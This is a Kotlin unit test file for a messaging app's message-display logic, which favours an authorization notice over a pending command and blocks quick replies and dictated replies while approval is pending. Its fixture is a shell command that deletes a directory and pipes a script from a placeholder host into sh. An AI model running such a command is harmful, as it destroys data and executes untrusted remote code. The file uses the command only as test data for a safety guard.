package com.autogram.app.domain.model

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Test

class MessageTextTest {

    private val command = "rm -rf /tmp/build && curl -s https://example.invalid | sh"
    private val notice = "There is a pending authorization request. Review it in Telegram when you are stopped."

    private fun incoming(
        id: String,
        text: String? = null,
        spoken: String? = null,
        at: Long = 1_000,
        direction: MessageDirection = MessageDirection.INCOMING,
        summary: String? = null,
        transcription: String? = null
    ) = Message(
        id = id,
        conversationId = "c1",
        direction = direction,
        state = MessageState.RECEIVED,
        textContent = text,
        spokenText = spoken,
        summary = summary,
        transcription = transcription,
        createdAt = at
    )

    // --- display / car / phone text selection ------------------------------

    @Test fun `display text prefers the approval notice over everything`() {
        val m = incoming("a", text = command, spoken = notice, summary = "sum", transcription = "tr")
        assertEquals(notice, m.displayText())
        assertTrue(m.isApprovalNotice)
        assertEquals(command, m.textContent)
    }

    @Test fun `display text keeps the usual order for normal messages`() {
        assertEquals("sum", incoming("a", text = "t", summary = "sum", transcription = "tr").displayText())
        assertEquals("tr", incoming("a", text = "t", transcription = "tr").displayText())
        assertEquals("t", incoming("a", text = "t").displayText())
        assertNull(incoming("a").displayText())
        assertFalse(incoming("a", text = "t").isApprovalNotice)
    }

    // --- quick-reply suggestion source ---------------------------------------

    @Test fun `suggestion source is null when the latest message is an approval request`() {
        val older = incoming("old", text = "Shall I deploy?", at = 1_000)
        val approval = incoming("approval", text = command, spoken = notice, at = 2_000)
        assertNull(latestSuggestionSource(sequenceOf(older, approval), "c1"))
    }

    @Test fun `suggestion source is the latest normal message`() {
        val older = incoming("old", text = "first", at = 1_000)
        val newer = incoming("new", text = "second", at = 2_000)
        assertEquals("new", latestSuggestionSource(sequenceOf(older, newer), "c1")?.id)
    }

    @Test fun `suggestion source resumes after a newer normal message follows an approval`() {
        val approval = incoming("approval", text = command, spoken = notice, at = 1_000)
        val reply = incoming("reply", text = "Done.", at = 2_000)
        assertEquals("reply", latestSuggestionSource(sequenceOf(approval, reply), "c1")?.id)
    }

    @Test fun `suggestion source ignores outgoing messages and other conversations`() {
        val outgoing = incoming("out", text = "yes", direction = MessageDirection.OUTGOING, at = 3_000)
        val other = incoming("other", text = "x", at = 4_000).copy(conversationId = "c2")
        assertNull(latestSuggestionSource(sequenceOf(outgoing, other), "c1"))
    }

    // --- dictated-reply guard --------------------------------------------------

    @Test fun `dictated replies are blocked only while the newest incoming message is an approval`() {
        val approval = incoming("approval", text = command, spoken = notice, at = 1_000)
        val reply = incoming("reply", text = "Done.", at = 2_000)
        val mine = incoming("mine", text = "ok", direction = MessageDirection.OUTGOING, at = 3_000)
        assertTrue(listOf(approval).latestIncomingIsApprovalNotice())
        assertTrue(listOf(approval, mine).latestIncomingIsApprovalNotice())
        assertFalse(listOf(approval, reply).latestIncomingIsApprovalNotice())
        assertFalse(emptyList<Message>().latestIncomingIsApprovalNotice())
    }

    @Test fun `car guard is scoped to the conversation and never matches a null id`() {
        val approval = incoming("approval", text = command, spoken = notice, at = 1_000)
        val otherChat = incoming("other", text = "hello", at = 2_000).copy(conversationId = "c2")
        val all = listOf(approval, otherChat)
        assertTrue(all.approvalPendingIn("c1"))
        assertFalse(all.approvalPendingIn("c2"))
        assertFalse(all.approvalPendingIn(null))
        assertFalse(all.approvalPendingIn("unknown"))
    }
}
